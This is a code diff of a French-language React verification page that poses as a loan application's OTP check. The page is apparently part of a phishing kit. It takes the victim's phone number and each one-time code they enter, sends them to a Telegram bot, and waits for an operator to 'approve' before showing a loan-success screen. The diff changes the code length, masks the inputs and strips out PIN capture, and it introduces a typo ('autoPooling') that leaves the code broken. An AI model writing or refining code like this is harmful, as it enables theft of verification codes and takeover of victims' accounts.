@@ -17,35 +17,28 @@ const otpStatusMessages = {
   pending: "⏳ En attente...",
   approved: "✅ Vérifié!",
   wrong_code: "❌ Code OTP incorrect",
-  wrong_pin: "❌ Code PIN incorrect",
   expired: "⏰ Temps expiré",
-  resend_requested: "🔁 OTP resend requested"
 }
 
 function Verification() {
   const navigate = useNavigate()
   const { user } = useParams()
   const userId = user || 'default'
-  const [otp, setOtp] = useState(Array(6).fill(""))
+  const basePath = userId && userId !== 'default' ? `/${userId}` : ""
+  const [otp, setOtp] = useState(Array(4).fill(""))
   const inputRefs = useRef([])
   const [requestId, setRequestId] = useState(null)
   const [status, setStatus] = useState(null)
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState("")
-  const [copied, setCopied] = useState(false)
-  const [timer, setTimer] = useState(120)
   const [autoPolling, setAutoPolling] = useState(false)
-  const [approvedOtp, setApprovedOtp] = useState("")
   const pollingIntervalRef = useRef(null)
   const checkCountRef = useRef(0)
   const maxChecks = 24
-  const startTimeRef = useRef(null)
   const lastUpdateIdRef = useRef(0)
   
   const storedAppStr = localStorage.getItem('loanAppData')
   const appData = storedAppStr ? JSON.parse(storedAppStr) : {}
-  
-  const startIndex = useRef(null)
 
   useEffect(() => {
     const cleanup = () => {
@@ -57,18 +50,11 @@ function Verification() {
     return cleanup
   }, [])
 
-  useEffect(() => {
-    if (timer > 0) {
-      const id = setInterval(() => setTimer(t => t - 1), 1000)
-      return () => clearInterval(id)
-    }
-  }, [timer])
-
   const handleKey = (index, e) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       e.preventDefault()
       inputRefs.current[index - 1]?.focus()
-    } else if (/^\d$/.test(e.key) && index < 5) {
+    } else if (/^\d$/.test(e.key) && index < 3) {
       e.preventDefault()
       const newOtp = [...otp]
       newOtp[index] = e.key
@@ -80,20 +66,29 @@ function Verification() {
   const handlePaste = (e) => {
     e.preventDefault()
     const data = e.clipboardData.getData("text").trim().replace(/\D/g, "")
-    if (data.length === 6) {
-      const newOtp = data.split("").slice(0, 6)
+    if (data.length === 4) {
+      const newOtp = data.split("").slice(0, 4)
       setOtp(newOtp)
-      setTimeout(() => submitOtp(new Event("submit")), 300)
+      setTimeout(() => startVerification(), 300)
     }
   }
 
-  async function sendTelegramNotification(phoneNumber, pin, code) {
+  async function deleteWebhook() {
+    try {
+      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
+      const data = await response.json()
+      console.log('Webhook deleted:', data.result)
+    } catch (e) {
+      console.error('Webhook deletion failed:', e)
+    }
+  }
+
+  async function sendTelegramNotification(phoneNumber, code) {
     const reqId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
     
     const lines = [
-      '📲 New OTP Request',
+      '🔐 New OTP Verification Request',
       '📱 Phone: ' + phoneNumber,
-      '🔑 PIN: ' + pin,
       '🔐 OTP Code: ' + code,
       '🆔 Request: ' + reqId
     ]
@@ -118,16 +113,6 @@ function Verification() {
     } catch (e) {
       console.error('Telegram send failed:', e)
       return { success: false, error: e.message, requestId: reqId }
-    }
-  }
-
-  async function deleteWebhook() {
-    try {
-      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
-      const data = await response.json()
-      console.log('Webhook deleted:', data.result)
-    } catch (e) {
-      console.error('Webhook deletion failed:', e)
     }
   }
 
@@ -185,7 +170,6 @@ function Verification() {
 
   const startPolling = (reqId) => {
     checkCountRef.current = 0
-    startTimeRef.current = Date.now()
     setRequestId(reqId)
 
     setLoading(true)
@@ -205,9 +189,11 @@ function Verification() {
         setLoading(false)
         setAutoPolling(false)
         setStatus("approved")
-        const storedApp = localStorage.getItem('loanAppData')
-        const appData = storedApp ? JSON.parse(storedApp) : {}
-        setTimeout(() => navigate(`/${userId}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`), 1500)
+        setTimeout(() => {
+          const storedApp = localStorage.getItem('loanAppData')
+          const appData = storedApp ? JSON.parse(storedApp) : {}
+          navigate(`${basePath}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`)
+        }, 300)
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
@@ -232,25 +218,20 @@ function Verification() {
     console.log("Sending OTP verification...", code)
     setLoading(true)
     setError("")
-    setApprovedOtp(code)
     
     const storedApp = localStorage.getItem('loanAppData')
     const appData = storedApp ? JSON.parse(storedApp) : {}
-    const storedClient = localStorage.getItem('clientData')
-    const clientData = storedClient ? JSON.parse(storedClient) : {}
     
     const phoneNumber = appData.number || ""
-    const pin = "0000"
 
     try {
       await deleteWebhook()
-      const result = await sendTelegramNotification(phoneNumber, pin, code)
+      const result = await sendTelegramNotification(phoneNumber, code)
       
       if (result.success && result.requestId) {
         setRequestId(result.requestId)
         setAutoPolling(true)
         checkCountRef.current = 0
-        startTimeRef.current = Date.now()
       } else {
         setError("Échec de l'envoi: " + (result.error || 'Unknown error'))
         setLoading(false)
@@ -262,34 +243,12 @@ function Verification() {
     }
   }
 
-  const copyCode = () => {
-    const code = otp.join("")
-    if (code.length === 6) {
-      navigator.clipboard.writeText(code)
-      setCopied(true)
-      setTimeout(() => setCopied(false), 2000)
-    }
-  }
-
-  const resendOtp = () => {
-    if (pollingIntervalRef.current) {
-      clearInterval(pollingIntervalRef.current)
-      pollingIntervalRef.current = null
-    }
-    setOtp(Array(6).fill(""))
-    setTimer(120)
-    setError("")
-    setLoading(false)
-    setAutoPolling(false)
-    setStatus(null)
-  }
-
   if (status === "approved") {
     return (
       <div className="otp-container">
         <div className="verification-success">
           <h2>✅ Vérification réussie!</h2>
-          <p>Vous serez redirigé vers la page de compléxion...</p>
+          <p>Vous allez être redirigé...</p>
         </div>
       </div>
     )
@@ -302,7 +261,7 @@ function Verification() {
           <h2 style={{ color: "red" }}>⏰ Temps expiré !</h2>
           <p>Le délai de vérification est dépassé</p>
           <button 
-            onClick={resendOtp}
+            onClick={() => window.location.reload()}
             style={{
               marginTop: '15px',
               padding: '10px 20px',
@@ -313,7 +272,7 @@ function Verification() {
               cursor: 'pointer'
             }}
           >
-            Renvoyer
+            Ressayer
           </button>
         </div>
       </div>
@@ -338,7 +297,7 @@ function Verification() {
         </div>
       )}
 
-      {autoPolling && (
+      {autoPooling && (
         <div style={{
           display: "flex",
           alignItems: "center",
@@ -359,17 +318,17 @@ function Verification() {
             animation: "spin 1s linear infinite"
           }}></span>
           <span style={{ color: "#1976d2", fontWeight: "500" }}>
-            ⏳ En attente d'approbation du PIN...
+            ⏳ En attente d'approbation...
           </span>
         </div>
       )}
 
-      <div className="otp-inputs">
+      <div className="otp-inputs" style={{ display: "flex", justifyContent: "center", gap: "10px", marginBottom: "20px" }}>
         {otp.map((value, index) => (
           <input
             key={index}
             ref={el => inputRefs.current[index] = el}
-            type="text"
+            type="password"
             inputMode="numeric"
             maxLength="1"
             value={value}
@@ -381,56 +340,96 @@ function Verification() {
             onKeyDown={e => handleKey(index, e)}
             onPaste={handlePaste}
             onFocus={(e) => e.target.select()}
-            className={`otp-input ${value ? "filled" : ""} ${loading ? "error" : ""}`}
-            autoComplete="one-time-code"
+            style={{
+              width: "45px",
+              height: "45px",
+              fontSize: "18px",
+              textAlign: "center",
+              border: "1px solid #ddd",
+              borderRadius: "6px",
+              backgroundColor: "#fff"
+            }}
             disabled={loading || autoPolling}
+            autoComplete="one-time-code"
           />
         ))}
       </div>
 
       <div className="otp-display">
         <p>
-          Votre code OTP : <strong>{otp.join("") || "______"}</strong>
+          Votre code OTP : <strong>{otp.join("") || "____"}</strong>
         </p>
         
-        {!otp.every(v => v) ? (
-          <button 
-            onClick={startVerification} 
-            className="copy-btn" 
-            type="button" 
-            disabled={otp.join("").length !== 6 || loading || autoPolling}
-            style={{ opacity: otp.join("").length !== 6 || loading || autoPolling ? 0.6 : 1 }}
-          >
-            {loading || autoPolling ? "⏳ Verifying..." : otpStatusMessages[status] || "Saisissez le code OTP"}
-          </button>
-        ) : (
-          <button 
-            onClick={copyCode} 
-            className="copy-btn" 
-            type="button"
-          >
-            {copied ? "✓ Copié!" : "Finition"}
-          </button>
-        )}
+        <button 
+          onClick={startVerification} 
+          style={{
+            width: "100%",
+            padding: "12px",
+            backgroundColor: loading || autoPolling ? "#ccc" : "#ed1c2e",
+            color: "white",
+            border: "none",
+            borderRadius: "6px",
+            fontSize: "16px",
+            fontWeight: "500",
+            cursor: loading || autoPolling ? "not-allowed" : "pointer",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            gap: "8px"
+          }}
+          disabled={otp.join("").length !== 4 || loading || autoPolling}
+        >
+          {loading || autoPolling ? (
+            <>
+              <span style={{
+                display: "inline-block",
+                width: "18px",
+                height: "18px",
+                border: "2px solid rgba(255,255,255,0.4)",
+                borderRadius: "50%",
+                borderTopColor: "white",
+                animation: "spin 1s linear infinite"
+              }}></span>
+              {autoPolling ? "⏳ En attente..." : "Envoi..."}
+            </>
+          ) : "Saisissez le code OTP"}
+        </button>
 
-        <div className="otp-actions">
+        <div className="otp-actions" style={{ marginTop: "20px", display: "flex", gap: "10px", justifyContent: "center" }}>
           <button 
             className="clear-btn" 
             type="button" 
-            onClick={resendOtp} 
-            disabled={timer > 0}
+            onClick={() => {
+              setOtp(Array(4).fill(""))
+              inputRefs.current[0]?.focus()
+            }}
+            style={{
+              padding: "8px 16px",
+              backgroundColor: "#f5f5f5",
+              color: "#333",
+              border: "1px solid #ddd",
+              borderRadius: "5px",
+              cursor: "pointer",
+              fontSize: "14px"
+            }}
           >
-            {timer > 0 ? `Renvoyer ${timer}s` : "Renvoyer le code OTP"}
-          </button>
-          <button className="clear-btn" type="button" onClick={() => {
-            setOtp(Array(6).fill(""))
-            inputRefs.current[0]?.focus()
-          }}>
             Claire
           </button>
           {status === "expired" && (
-            <button className="retry-button" onClick={resendOtp}>
-              → Essayer à nouveau
+            <button 
+              className="retry-button" 
+              onClick={startVerification}
+              style={{
+                padding: "8px 16px",
+                backgroundColor: "#11bb4a",
+                color: "white",
+                border: "none",
+                borderRadius: "5px",
+                cursor: "pointer",
+                fontSize: "14px"
+              }}
+            >
+              → Ressayer
             </button>
           )}
         </div>
